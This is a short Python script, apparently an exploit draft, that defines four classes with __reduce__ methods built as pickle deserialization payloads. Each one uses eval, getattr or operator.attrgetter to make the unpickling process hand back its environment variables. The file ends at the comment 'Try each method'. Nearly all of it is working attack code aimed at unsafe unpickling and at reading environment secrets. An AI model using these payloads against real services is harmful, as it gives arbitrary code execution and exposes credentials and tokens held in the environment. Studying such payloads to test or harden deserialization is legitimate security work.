import pickle
import base64
import os

# Method 1: Using eval to get all environment variables as a dict
class ExploitEval:
    def __reduce__(self):
        # Use eval to return os.environ as a dictionary
        return (eval, ("dict(os.environ)",))

# Method 2: Using os.environ.copy wrapped differently  
class ExploitCopy:
    def __reduce__(self):
        # Use getattr to access environ
        return (getattr, (os, 'environ'))

# Method 3: Using __builtins__.eval
class ExploitBuiltins:
    def __reduce__(self):
        return (eval, ("__import__('os').environ.copy()",))

# Method 4: Direct attribute access via operator.attrgetter (most reliable)
import operator
class ExploitAttr:
    def __reduce__(self):
        return (operator.attrgetter('environ'), (os,))

# Try each method
